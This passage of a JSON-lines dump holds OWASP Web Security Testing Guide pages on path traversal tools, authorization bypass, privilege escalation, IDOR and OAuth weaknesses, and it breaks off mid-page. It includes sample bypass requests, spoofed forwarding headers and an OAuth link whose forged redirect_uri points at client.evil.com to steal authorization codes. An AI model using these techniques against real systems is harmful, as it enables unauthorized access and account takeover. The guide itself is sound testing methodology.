Tool)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/Traversal.txt)\n- [ZAP](https://www.zaproxy.org/)\n- [Burp Suite](https://portswigger.net)\n- Encoding/Decoding tools\n- [String searcher \"grep\"](https://www.gnu.org/software/grep/)\n- [DirBuster](https://wiki.owasp.org/index.php/Category:OWASP_DirBuster_Project)\n\n## References\n\n- [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)\n- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)\n\n### Whitepapers\n\n- [phpBB Attachment Mod Directory Traversal HTTP POST Injection](https://seclists.org/vulnwatch/2004/q4/33)\n- [Windows File Pseudonyms: Pwnage and Poetry](https://www.slideshare.net/BaronZor/windows-file-pseudonyms)\n", "timestamp": "2025-10-24T11:39:48.086068"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md", "content": "# Testing for Bypassing Authorization Schema\n\n|ID          |\n|------------|\n|WSTG-ATHZ-02|\n\n## Summary\n\nThis kind of test focuses on verifying how the authorization schema has been implemented for each role or privilege to get access to reserved functions and resources.\n\nFor every specific role the tester holds during the assessment and for every function and request that the application executes during the post-authentication phase, it is necessary to verify:\n\n- Is it possible to access that resource even if the user is not authenticated?\n- Is it possible to access that resource after the log-out?\n- Is it possible to access functions and resources that should be accessible to a user that holds a different role or privilege?\n\nTry to access the application as an administrative user and track all the administrative functions.\n\n- Is it possible to access administrative functions if the tester is logged in as a non-admin user?\n- Is it possible to use these administrative functions as a user with a different role and for whom that action should be denied?\n\n## Test Objectives\n\n- Assess if unauthenticated, horizontal, or vertical access is possible.\n\n## How to Test\n\n- Access resources and conduct operations without login. - Direct page request ([forced browsing](https://owasp.org/www-community/attacks/Forced_browsing))\n- Access resources and conduct operations horizontally.\n- Access resources and conduct operations vertically.\n\n### Testing for Basic Unauthenticated Access\n\n#### Using a Browser Manually\n\nWhen a web application does not properly enforce access control mechanisms, sensitive resources become exposed, allowing unauthenticated users to view them. For example, if a user directly requests a different page via forced browsing, that page may not check the authorization of the anonymous user before granting access. Attempt to directly access a protected page through the address bar in your browser to test using this method.\n\n![Direct Request to Protected Page](images/Basm-directreq.jpg)\\\n*Figure 4.5.2-1: Direct Request to Protected Page*\n\n#### Using Automation\n\nThis process can be automated if you have a list of all endpoints with tools like ffuf, gobuster, ZAP, and Burp Suite Intruder.\n\nFor ZAP, using a adddon for [Access Control Testing](https://www.zaproxy.org/docs/desktop/addons/access-control-testing/) allows testers to determine which parts of the application are available to anonymous users, and identify potential access control issues.\n\nFor Burp Suite, built-in tools such as Intruder, and a number of plugins, including Autorize, help the tester automate testing authorization.\n\n### Testing for Horizontal Bypassing Authorization Schema\n\nFor every function, specific role, or request that the application executes, it is necessary to verify:\n\n- Is it possible to access resources that should be accessible to a user that holds a different identity with the same role or privilege?\n- Is it possible to operate functions on resources that should be accessible to a user that holds a different identity?\n\nFor each role:\n\n1. Register or generate two users with identical privileges.\n2. Establish and keep two different sessions active (one for each user).\n3. For every request, change the relevant parameters and the session identifier from token one to token two and diagnose the responses for each token.\n4. An application will be considered vulnerable if the responses are the same, contain same private data or indicate successful operation on other users' resource or data.\n\nFor example, suppose that the `viewSettings` function is part of every account menu of the application with the same role, and it is possible to access it by requesting the following URL: `https://www.example.com/account/viewSettings`. Then, the following HTTP request is generated when calling the `viewSettings` function:\n\n```http\nPOST /account/viewSettings HTTP/1.1\nHost: www.example.com\n[other HTTP headers]\nCookie: SessionID=USER_SESSION\n\nusername=example_user\n```\n\nValid and legitimate response:\n\n```html\nHTTP1.1 200 OK\n[other HTTP headers]\n\n{\n  \"username\": \"example_user\",\n  \"email\": \"example@email.com\",\n  \"address\": \"Example Address\"\n}\n```\n\nThe attacker may try and execute that request with the same `username` parameter:\n\n```html\nPOST /account/viewCCpincode HTTP/1.1\nHost: www.example.com\n[other HTTP headers]\nCookie: SessionID=ATTACKER_SESSION\n\nusername=example_user\n```\n\nIf the attacker's response contain the data of the `example_user`, then the application is vulnerable for lateral movement attacks, where a user can read or write other user's data.\n\n### Testing for Access to Administrative Functions\n\nFor example, suppose that the `addUser` function is part of the administrative menu of the application, and it is possible to access it by requesting the following URL `https://www.example.com/admin/addUser`.\n\nThen, the following HTTP request is generated when calling the `addUser` function:\n\n```http\nPOST /admin/addUser HTTP/1.1\nHost: www.example.com\n[...]\n\nuserID=fakeuser&role=3&group=grp001\n```\n\nFurther questions or considerations would go in the following direction:\n\n- What happens if a non-administrative user tries to execute that request?\n- Will the user be created?\n- If so, can the new user use their privileges?\n\n### Testing for Access to Resources Assigned to a Different Role\n\nVarious applications setup resource controls based on user roles. Let's take an example resumes or CVs (curriculum vitae) uploaded on a careers form to an S3 bucket.\n\nAs a normal user, try accessing the location of those files. If you are able to retrieve them, modify them, or delete them, then the application is vulnerable.\n\n### Testing for Special Request Header Handling\n\nSome applications support non-standard headers such as `X-Original-URL` or `X-Rewrite-URL` in order to allow overriding the target URL in requests with the one specified in the header value.\n\nThis behavior can be leveraged in a situation in which the application is behind a component that applies access control restriction based on the request URL.\n\nThe kind of access control restriction based on the request URL can be, for example, blocking access from internet to an administration console exposed on `/console` or `/admin`.\n\nTo detect the support for the header `X-Original-URL` or `X-Rewrite-URL`, the following steps can be applied.\n\n#### 1. Send a Normal Request without Any X-Original-Url or X-Rewrite-Url Header\n\n```http\nGET / HTTP/1.1\nHost: www.example.com\n[...]\n```\n\n#### 2. Send a Request with an X-Original-Url Header Pointing to a Non-Existing Resource\n\n```html\nGET / HTTP/1.1\nHost: www.example.com\nX-Original-URL: /donotexist1\n[...]\n```\n\n#### 3. Send a Request with an X-Rewrite-Url Header Pointing to a Non-Existing Resource\n\n```html\nGET / HTTP/1.1\nHost: www.example.com\nX-Rewrite-URL: /donotexist2\n[...]\n```\n\nIf the response for either request contains markers that the resource was not found, this indicates that the application supports the special request headers. These markers may include the HTTP response status code 404, or a \"resource not found\" message in the response body.\n\nOnce the support for the header `X-Original-URL` or `X-Rewrite-URL` was validated then the tentative of bypass against the access control restriction can be leveraged by sending the expected request to the application but specifying a URL \"allowed\" by the frontend component as the main request URL and specifying the real target URL in the `X-Original-URL` or `X-Rewrite-URL` header depending on the one supported. If both are supported then try one after the other to verify for which header the bypass is effective.\n\n#### 4. Other Headers to Consider\n\nOften admin panels or administrative related bits of functionality are only accessible to clients on local networks, therefore it may be possible to abuse various proxy or forwarding related HTTP headers to gain access. Some headers and values to test with are:\n\n- Headers:\n    - `X-Forwarded-For`\n    - `X-Forward-For`\n    - `X-Remote-IP`\n    - `X-Originating-IP`\n    - `X-Remote-Addr`\n    - `X-Client-IP`\n- Values\n    - `127.0.0.1` (or anything in the `127.0.0.0/8` or `::1/128` address spaces)\n    - `localhost`\n    - Any [RFC1918](https://tools.ietf.org/html/rfc1918) address:\n        - `10.0.0.0/8`\n        - `172.16.0.0/12`\n        - `192.168.0.0/16`\n    - Link local addresses: `169.254.0.0/16`\n\nNote: Including a port element along with the address or hostname may also help bypass edge protections such as web application firewalls, etc.\nFor example: `127.0.0.4:80`, `127.0.0.4:443`, `127.0.0.4:43982`\n\n## Remediation\n\nEmploy the least privilege principles on the users, roles, and resources to ensure that no unauthorized access occurs.\n\n## Tools\n\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)\n    - [ZAP add-on: Access Control Testing](https://www.zaproxy.org/docs/desktop/addons/access-control-testing/)\n- [Port Swigger Burp Suite](https://portswigger.net/burp)\n    - [Burp extension: AuthMatrix](https://github.com/SecurityInnovation/AuthMatrix/)\n    - [Burp extension: Autorize](https://github.com/Quitten/Autorize)\n\n## References\n\n[OWASP Application Security Verification Standard 4.0.1](https://github.com/OWASP/ASVS/tree/master/4.0), v4.0.1-1, v4.0.1-4, v4.0.1-9, v4.0.1-16\n", "timestamp": "2025-10-24T11:39:48.190161"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md", "content": "# Testing for Privilege Escalation\n\n|ID          |\n|------------|\n|WSTG-ATHZ-03|\n\n## Summary\n\nThis section describes the issue of escalating privileges from one stage to another. During this phase, the tester should verify that it is not possible for a user to modify their privileges or roles inside the application in ways that could allow privilege escalation attacks.\n\nPrivilege escalation occurs when a user gets access to more resources or functionality than they are normally allowed, and such elevation or changes should have been prevented by the application. This is usually caused by a flaw in the application. The result is that the application performs actions with more privileges than those intended by the developer or system administrator.\n\nThe degree of escalation depends on what privileges the attacker is authorized to possess, and what privileges can be obtained in a successful exploit. For example, a programming error that allows a user to gain extra privilege after successful authentication limits the degree of escalation, because the user is already authorized to hold some privilege. Likewise, a remote attacker gaining superuser privilege without any authentication presents a greater degree of escalation.\n\nUsually, people refer to *vertical escalation* when it is possible to access resources granted to more privileged accounts (e.g., acquiring administrative privileges for the application), and to *horizontal escalation* when it is possible to access resources granted to a similarly configured account (e.g., in an online banking application, accessing information related to a different user).\n\n## Test Objectives\n\n- Identify injection points related to privilege manipulation.\n- Fuzz or otherwise attempt to bypass security measures.\n\n## How to Test\n\n### Testing for Role/Privilege Manipulation\n\nIn every portion of the application where a user can create information in the database (e.g., making a payment, adding a contact, or sending a message), can receive information (statement of account, order details, etc.), or delete information (drop users, messages, etc.), it is necessary to record that functionality. The tester should try to access such functions as another user in order to verify if it is possible to access a function that should not be permitted by the user's role/privilege (but might be permitted as another user).\n\n#### Manipulation of User Group\n\nFor example:\nThe following HTTP POST allows the user that belongs to `grp001` to access order #0001:\n\n```http\nPOST /user/viewOrder.jsp HTTP/1.1\nHost: www.example.com\n...\n\ngroupID=grp001&orderID=0001\n```\n\nVerify if a user that does not belong to `grp001` can modify the value of the parameters `groupID` and `orderID` to gain access to that privileged data.\n\n#### Manipulation of User Profile\n\nFor example:\nThe following server's answer shows a hidden field in the HTML returned to the user after a successful authentication.\n\n```html\nHTTP/1.1 200 OK\nServer: Netscape-Enterprise/6.0\nDate: Wed, 1 Apr 2006 13:51:20 GMT\nSet-Cookie: USER=aW78ryrGrTWs4MnOd32Fs51yDqp; path=/; domain=www.example.com\nSet-Cookie: SESSION=k+KmKeHXTgDi1J5fT7Zz; path=/; domain= www.example.com\nCache-Control: no-cache\nPragma: No-cache\nContent-length: 247\nContent-Type: text/html\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\n\n<form  name=\"autoriz\" method=\"POST\" action = \"visual.jsp\">\n<input type=\"hidden\" name=\"profile\" value=\"SysAdmin\">\\\n\n<body onload=\"document.forms.autoriz.submit()\">\n</td>\n</tr>\n```\n\nWhat if the tester modifies the value of the variable `profile` to `SysAdmin`? Is it possible to become **administrator**?\n\n#### Manipulation of Condition Value\n\nFor example:\nIn an environment where the server sends an error message contained as a value in a specific parameter in a set of answer codes, as the following:\n\n```text\n@0`1`3`3``0`UC`1`Status`OK`SEC`5`1`0`ResultSet`0`PVValid`-1`0`0` Notifications`0`0`3`Command  Manager`0`0`0` StateToolsBar`0`0`0`\nStateExecToolBar`0`0`0`FlagsToolBar`0\n```\n\nThe server gives an implicit trust to the user. It believes that the user will answer with the above message closing the session.\n\nIn this condition, verify that it is not possible to escalate privileges by modifying the parameter values. In this particular example, by modifying the `PVValid` value from `-1` to `0` (no error conditions), it may be possible to authenticate as administrator to the server.\n\n#### Manipulation of IP Address\n\nSome sites limit access or count the number of failed login attempts based on IP address.\n\nFor example:\n\n```text\nX-Forwarded-For: 8.1.1.1\n```\n\nIn this case, if the site uses the value of `X-forwarded-For` as client IP address, tester may change the IP value of the `X-forwarded-For` HTTP header to workaround the IP source identification.\n\n### Testing for Vertical Bypassing Authorization Schema\n\nA vertical authorization bypass is specific to the case that an attacker obtains a role higher than their own. Testing for this bypass focuses on verifying how the vertical authorization schema has been implemented for each role. For every function, page, specific role, or request that the application executes, it is necessary to verify if it is possible to:\n\n- Access resources that should be accessible only to a higher role user.\n- Operate functions on resources that should be operative only by a user that holds a higher or specific role identity.\n\nFor each role:\n\n1. Register a user.\n2. Establish and maintain two different sessions based on the two different roles.\n3. For every request, change the session identifier from the original to another role's session identifier and evaluate the responses for each.\n4. An application will be considered vulnerable if the weaker privileged session contains the same data, or indicate successful operations on higher privileged functions.\n\n#### Banking Site Roles Scenario\n\nThe following table illustrates the system roles on a banking site. Each role binds with specific permissions for the event menu functionality:\n\n|      ROLE     |     PERMISSION    | ADDITIONAL PERMISSION |\n|---------------|-------------------|-----------------------|\n| Administrator | Full Control      | Delete                |\n| Manager       | Modify, Add, Read | Add                   |\n| Staff         | Read, Modify      | Modify                |\n| Customer      | Read Only         |                       |\n\nThe application will be considered vulnerable if the:\n\n1. Customer could operate administrator, manager or staff functions;\n2. Staff user could operate manager or administrator functions;\n3. Manager could operate administrator functions.\n\nSuppose that the `deleteEvent` function is part of the administrator account menu of the application, and it is possible to access it by requesting the following URL: `https://www.example.com/account/deleteEvent`. Then, the following HTTP request is generated when calling the `deleteEvent` function:\n\n```http\nPOST /account/deleteEvent HTTP/1.1\nHost: www.example.com\n[other HTTP headers]\nCookie: SessionID=ADMINISTRATOR_USER_SESSION\n\nEventID=1000001\n```\n\nThe valid response:\n\n```http\nHTTP/1.1 200 OK\n[other HTTP headers]\n\n{\"message\": \"Event was deleted\"}\n```\n\nThe attacker may try and execute the same request:\n\n```http\nPOST /account/deleteEvent HTTP/1.1\nHost: www.example.com\n[other HTTP headers]\nCookie: SessionID=CUSTOMER_USER_SESSION\n\nEventID=1000002\n```\n\nIf the response of the attacker’s request contains the same data `{\"message\": \"Event was deleted\"}` the application is vulnerable.\n\n#### Administrator Page Access\n\nSuppose that the administrator menu is part of the administrator account.\n\nThe application will be considered vulnerable if any role other than administrator could access the administrator menu. Sometimes, developers perform authorization validation at the GUI level only, and leave the functions without authorization validation, thus potentially resulting in a vulnerability.\n\n### URL Traversal\n\nTry to traverse the site and check if some of pages that may miss the authorization check.\n\nFor example:\n\n```text\n/../.././userInfo.html\n```\n\n### WhiteBox\n\nIf the URL authorization check is only done by partial URL match, then it's likely testers or hackers may workaround the authorization by URL encoding techniques.\n\nFor example:\n\n```text\nstartswith(), endswith(), contains(), indexOf()\n```\n\n## References\n\n### Whitepapers\n\n- [Wikipedia - Privilege Escalation](https://en.wikipedia.org/wiki/Privilege_escalation)\n\n## Tools\n\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)\n", "timestamp": "2025-10-24T11:39:48.347143"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md", "content": "# Testing for Insecure Direct Object References\n\n|ID          |\n|------------|\n|WSTG-ATHZ-04|\n\n## Summary\n\nInsecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files.\nInsecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system, and more. This is caused by the fact that the application takes user supplied input and uses it to retrieve an object without performing sufficient authorization checks.\n\n## Test Objectives\n\n- Identify points where object references may occur.\n- Assess the access control measures and if they're vulnerable to IDOR.\n\n## How to Test\n\nTo test for this vulnerability the tester first needs to map out all locations in the application where user input is used to reference objects directly. For example, locations where user input is used to access a database row, a file, application pages and more. Next the tester should modify the value of the parameter used to reference objects and assess whether it is possible to retrieve objects belonging to other users or otherwise bypass authorization.\n\nThe best way to test for direct object references would be by having at least two (often more) users to cover different owned objects and functions. For example two users each having access to different objects (such as purchase information, private messages, etc.), and (if relevant) users with different privileges (for example administrator users) to see whether there are direct references to application functionality. By having multiple users the tester saves valuable testing time in guessing different object names as he can attempt to access objects that belong to the other user.\n\nBelow are several typical scenarios for this vulnerability and the methods to test for each:\n\n### The Value of a Parameter Is Used Directly to Retrieve a Database Record\n\nSample request:\n\n```text\nhttps://foo.bar/somepage?invoice=12345\n```\n\nIn this case, the value of the *invoice* parameter is used as an index in an invoices table in the database. The application takes the value of this parameter and uses it in a query to the database. The application then returns the invoice information to the user.\n\nSince the value of *invoice* goes directly into the query, by modifying the value of the parameter it is possible to retrieve any invoice object, regardless of the user to whom the invoice belongs. To test for this case the tester should obtain the identifier of an invoice belonging to a different test user (ensuring he is not supposed to view this information per application business logic), and then check whether it is possible to access objects without authorization.\n\n### The Value of a Parameter Is Used Directly to Perform an Operation in the System\n\nSample request:\n\n```text\nhttps://foo.bar/changepassword?user=someuser\n```\n\nIn this case, the value of the `user` parameter is used to tell the application for which user it should change the password. In many cases this step will be a part of a wizard, or a multi-step operation. In the first step the application will get a request stating for which user's password is to be changed, and in the next step the user will provide a new password (without asking for the current one).\n\nThe `user` parameter is used to directly reference the object of the user for whom the password change operation will be performed. To test for this case the tester should attempt to provide a different test username than the one currently logged in, and check whether it is possible to modify the password of another user.\n\n### The Value of a Parameter Is Used Directly to Retrieve a File System Resource\n\nSample request:\n\n```text\nhttps://foo.bar/showImage?img=img00011\n```\n\nIn this case, the value of the `file` parameter is used to tell the application what file the user intends to retrieve. By providing the name or identifier of a different file (for example file=image00012.jpg) the attacker will be able to retrieve objects belonging to other users.\n\nTo test for this case, the tester should obtain a reference the user is not supposed to be able to access and attempt to access it by using it as the value of `file` parameter. Note: This vulnerability is often exploited in conjunction with a directory/path traversal vulnerability (see [Testing for Path Traversal](01-Testing_Directory_Traversal_File_Include.md))\n\n### The Value of a Parameter Is Used Directly to Access Application Functionality\n\nSample request:\n\n```text\nhttps://foo.bar/accessPage?menuitem=12\n```\n\nIn this case, the value of the `menuitem` parameter is used to tell the application which menu item (and therefore which application functionality) the user is attempting to access. Assume the user is supposed to be restricted and therefore has links available only to access to menu items 1, 2 and 3. By modifying the value of `menuitem` parameter it is possible to bypass authorization and access additional application functionality. To test for this case the tester identifies a location where application functionality is determined by reference to a menu item, maps the values of menu items the given test user can access, and then attempts other menu items.\n\nIn the above examples the modification of a single parameter is sufficient. However, sometimes the object reference may be split between more than one parameter, and testing should be adjusted accordingly.\n\n## References\n\n[Top 10 2013-A4-Insecure Direct Object References](https://owasp.org/www-project-top-ten/2017/Release_Notes)\n", "timestamp": "2025-10-24T11:39:48.455947"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses.md", "content": "# Testing for OAuth Weaknesses\n\n|ID          |\n|------------|\n|WSTG-ATHZ-05|\n\n## Summary\n\n[OAuth2.0](https://oauth.net/2/) (hereinafter referred to as OAuth) is an authorization framework that allows a client to access resources on the behalf of its user.\n\nIn order to achieve this, OAuth heavily relies on tokens to communicate between the different entities, each entity having a different [role](https://datatracker.ietf.org/doc/html/rfc6749#section-1.1):\n\n- **Resource Owner:** The entity who grants access to a resource, the owner, and in most cases is the user themselves\n- **Client:** The application that is requesting access to a resource on behalf of the Resource Owner. These clients come in two [types](https://oauth.net/2/client-types/):\n    - **Public:** clients that can't protect a secret (*e.g.* frontend focused applications, such as SPAs, mobile applications, etc.)\n    - **Confidential:** clients that are able to securely authenticate with the authorization server by keeping their registered secrets safe (*e.g.* backend services)\n- **Authorization Server:** The server that holds authorization information and grants the access\n- **Resource Server:** The application that serves the content accessed by the client\n\nSince OAuth's responsibility is to delegate access rights by the owner to the client, this is a very attractive target for attackers, and bad implementations lead to unauthorized access to the users' resources and information.\n\nIn order to provide access to a client application, OAuth relies on several [authorization grant types](https://oauth.net/2/grant-types/) to generate an access token:\n\n- [Authorization Code](https://oauth.net/2/grant-types/authorization-code/): used by both confidential and public clients to exchange an authorization code for an access token, but recommended only for confidential clients\n- [Proof Key for Code Exchange (PKCE)](https://oauth.net/2/pkce/): PKCE builds on top of the Authorization Code grant, providing stronger security for it to be used by public clients, and improving the posture of confidential ones\n- [Client Credentials](https://oauth.net/2/grant-types/client-credentials/): used for machine to machine communication, where the \"user\" here is the machine requesting access to its own resources from the Resource Server\n- [Device Code](https://oauth.net/2/grant-types/device-code/): used for devices with limited input capabilities.\n- [Refresh Token](https://oauth.net/2/grant-types/refresh-token/): tokens provided by the authorization server to allow clients to refresh users' access tokens once they become invalid or expire. This grant type is used in conjunction with one other grant type.\n\nTwo flows will be deprecated in the release of [OAuth2.1](https://oauth.net/2.1/), and their usage is not recommended:\n\n- [Implicit Flow*](https://oauth.net/2/grant-types/implicit/): PKCE's secure implementation renders this flow obsolete. Prior to PKCE, the implicit flow was used by client-side applications such as [single page applications](https://en.wikipedia.org/wiki/Single-page_application) since [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) relaxed the [same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) for sites to inter-communicate. For more information on why the implicit grant is not recommended, review this [section](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#section-2.1.2).\n- [Resource Owner Password Credentials](https://oauth.net/2/grant-types/password/):used to exchange users' credentials directly with the client, which then sends them to the authorization to exchange them for an access token. For information on why this flow is not recommended, review this [section](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics#section-2.4).\n\n*: The implicit flow in OAuth only is deprecated, yet is still a viable solution within Open ID Connect (OIDC) to retrieve `id_tokens`. Be careful to understand how the implicit flow is being used, which can be identified if only the `/authorization` endpoint is being used to gain an access token, without relying on `/token` endpoint in any way. An example on this can be found [here](https://auth0.com/docs/get-started/authentication-and-authorization-flow/implicit-flow-with-form-post).\n\n*Please note that OAuth flows are a complex topic, and the above includes only a summary of the key areas. The inline references contain further information about the specific flows.*\n\n## Test Objectives\n\n- Determine if OAuth2 implementation is vulnerable or using a deprecated or custom implementation.\n\n## How to Test\n\n### Testing for Deprecated Grant Types\n\nDeprecated grant types were obsoleted for security and functionality reasons. Identifying if they're being used allows us to quickly review if they're susceptible to any of the threats pertaining to their usage. Some might be out of scope to the attacker, such as the way a client might be using the users' credentials. This should be documented and raised to the internal engineering teams.\n\nFor public clients, it is generally possible to identify the grant type in the request to the `/token` endpoint. It is indicated in the token exchange with the parameter `grant_type`.\n\nThe following example shows the Authorization Code grant with PKCE.\n\n```http\nPOST /oauth/token HTTP/1.1\nHost: as.example.com\n[...]\n\n{\n  \"client_id\":\"example-client\",\n  \"code_verifier\":\"example\",\n  \"grant_type\":\"authorization_code\",\n  \"code\":\"example\",\n  \"redirect_uri\":\"https://client.example.com\"\n}\n```\n\nThe values for the `grant_type` parameter and the grant type they indicate are:\n\n- `password`: Indicates the ROPC grant.\n- `client_credentials`: Indicates the Client Credential grant.\n- `authorization_code`: Indicates the Authorization Code grant.\n\nThe Implicit Flow type is not indicated by the `grant_type` parameter since the token is presented in the response to the `/authorization` endpoint request, and instead can be identified through the `response_type`. Below is an example.\n\n```http\nGET /authorize\n  ?client_id=<some_client_id>\n  &response_type=token \n  &redirect_uri=https%3A%2F%2Fclient.example.com%2F\n  &scope=openid%20profile%20email\n  &state=<random_state>\n```\n\nThe following URL parameters indicate the OAuth flow being used:\n\n- `response_type=token`: Indicates Implicit Flow, as the client is directly requesting from the authorization server to return a token.\n- `response_type=code`: Indicates Authorization Code flow, as the client is requesting from the authorization server to return a code, that will be exchanged afterwards with a token.\n- `code_challenge=sha256(xyz)`: Indicates the PKCE extension, as no other flow uses this parameter.\n\nThe following is an example authorization request for Authorization Code flow with PKCE:\n\n```http\nGET /authorize\n    ?redirect_uri=https%3A%2F%2Fclient.example.com%2F\n    &client_id=<some_client_id>\n    &scope=openid%20profile%20email\n    &response_type=code\n    &response_mode=query\n    &state=<random_state>\n    &nonce=<random_nonce>\n    &code_challenge=<random_code_challenge>\n    &code_challenge_method=S256 HTTP/1.1\nHost: as.example.com\n[...]\n```\n\n#### Public Clients\n\nThe Authorization Code grant with PKCE extension is recommended for public clients. An authorization request for Authorization Code flow with PKCE should contain `response_type=code` and `code_challenge=sha256(xyz)`.\n\nThe token exchange should contain the grant type `authorization_code` and a `code_verifier`.\n\nImproper grant types for public clients are:\n\n- Authorization Code grant without the PKCE extension\n- Client Credentials\n- Implicit Flow\n- ROPC\n\n#### Confidential Clients\n\nThe Authorization Code grant is recommended for confidential clients. The PKCE extension may be used as well.\n\nImproper grant types for confidential clients are:\n\n- Client Credentials (Except for machine-to-machine -- see below)\n- Implicit Flow\n- ROPC\n\n##### Machine-to-Machine\n\nIn situations where no user interaction occurs and the clients are only confidential clients, the Client Credentials grant may be used.\n\nIf you know the `client_id` and `client_secret`, it is possible to obtain a token by passing the `client_credentials` grant type.\n\n```bash\n$ curl --request POST \\\n  --url https://as.example.com/oauth/token \\\n  --header 'content-type: application/json' \\\n  --data '{\"client_id\":\"<some_client_id>\",\"client_secret\":\"<some_client_secret>\",\"grant_type\":\"client_credentials\"}' --proxy https://localhost:8080/ -k\n```\n\n### Credential Leakage\n\nDepending on the flow, OAuth transports several types of credentials in as URL parameters.\n\nThe following tokens can be considered to be leaked credentials:\n\n- access token\n- refresh token\n- authorization code\n- PKCE code challenge / code verifier\n\nDue to how OAuth works, the authorization `code` as well as the `code_challenge`, and `code_verifier` may be part of the URL. The implicit flow transports the authorization token as part of the URL if the `response_mode` is not set to [`form_post`](https://openid.net/specs/oauth-v2-form-post-response-mode-1_0.html). This may lead to leakage of the requested token or code in the referrer header, in log files, and proxies due to these parameters being passed either in the query or the fragment.\n\nThe risk that's carried by the implicit flow leaking the tokens is far higher than leaking the `code` or any other `code_*` parameters, as they are bound to specific clients and are harder to abuse in case of leakage.\n\nIn order to test this scenario, make use of an HTTP intercepting proxy such as ZAP and intercept the OAuth traffic.\n\n- Step through the authorization process and identify any credentials present in the URL.\n- If any external resources are included in a page involved with the OAuth flow, analyze the request made to them. Credentials could be leaked in the referrer header.\n\nAfter stepping through the OAuth flow and using the application, a few requests are captured in the request history of an HTTP intercepting proxy. Search for the HTTP referrer header (e.g. `Referer: https://idp.example.com/`) containing the authorization server and client URL in the request history.\n\nReviewing the HTML meta tags (although this tag is [not supported](https://caniuse.com/mdn-html_elements_meta_name_referrer) on all browsers), or the [Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy) could help assess if any credential leakage is happening through the referrer header.\n\n## Related Test Cases\n\n- [Testing JSON Web Tokens](../06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md)\n\n## Remediation\n\n- When implementing OAuth, always consider the technology used and whether the application is a server-side application that can avoid revealing secrets, or a client-side application that cannot.\n- In almost any case, use the Authorization Code flow with PKCE. One exception may be machine-to-machine flows.\n- Use POST parameters or header values to transport secrets.\n- When no other possibilities exists (for example, in legacy applications that can not be migrated), implement additional security headers such as a `Referrer-Policy`.\n\n## Tools\n\n- [BurpSuite](https://portswigger.net/burp/releases)\n- [EsPReSSO](https://github.com/portswigger/espresso)\n- [ZAP](https://www.zaproxy.org/)\n\n## References\n\n- [User Authentication with OAuth 2.0](https://oauth.net/articles/authentication/)\n- [The OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749)\n- [The OAuth 2.0 Authorization Framework: Bearer Token Usage](https://datatracker.ietf.org/doc/html/rfc6750)\n- [OAuth 2.0 Threat Model and Security Considerations](https://datatracker.ietf.org/doc/html/rfc6819)\n- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-16)\n- [Authorization Code Flow with Proof Key for Code Exchange](https://auth0.com/docs/authorization/flows/authorization-code-flow-with-proof-key-for-code-exchange-pkce)\n", "timestamp": "2025-10-24T11:39:48.589857"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses.md", "content": "# Testing for OAuth Authorization Server Weaknesses\n\n## Summary\n\nOAuth stores the identities of users and their corresponding access rights with the Authorization Server (AS). The AS plays a crucial role during the OAuth flow as it grants clients access to resources. To be able to do that securely, it must properly validate parameters that are part of the OAuth flow.\n\nFailure to validate the parameters may lead to account takeover, unauthorized resource access and the elevation of privileges.\n\n## Test Objectives\n\n- Identify weaknesses in the Authorization Server.\n\n## How to Test\n\nIn order to test for AS weaknesses, you will aim to:\n\n1. Retrieve credentials used for authorization.\n2. Grant yourself access to arbitrary resources through forceful browsing.\n3. Bypass the authorization.\n\n### Testing for Insufficient Redirect URI Validation\n\nIf the `redirect_uri` is not properly validated, a link can be crafted that contains a URL pointing to a server controlled by an attacker. This can be used to trick the AS into sending an authorization code to the attacker. In the following example, `client.evil.com` is used as the forged `redirect_uri`.\n\n```text\nhttps://as.example.com/authorize?client_id=example-client&redirect_uri=http%3A%2F%client.evil.com%2F&state=example&response_mode=fragment&response_type=code&scope=openid&nonce=example\n```\n\nIf a user opens this link in the user agent, the AS will redirect the user agent to the malicious URL.\n\nAn attacker can capture the `code` value passed in the spoofed URL and then submit it to the AS token endpoint.\n\nThe following request illustrates an 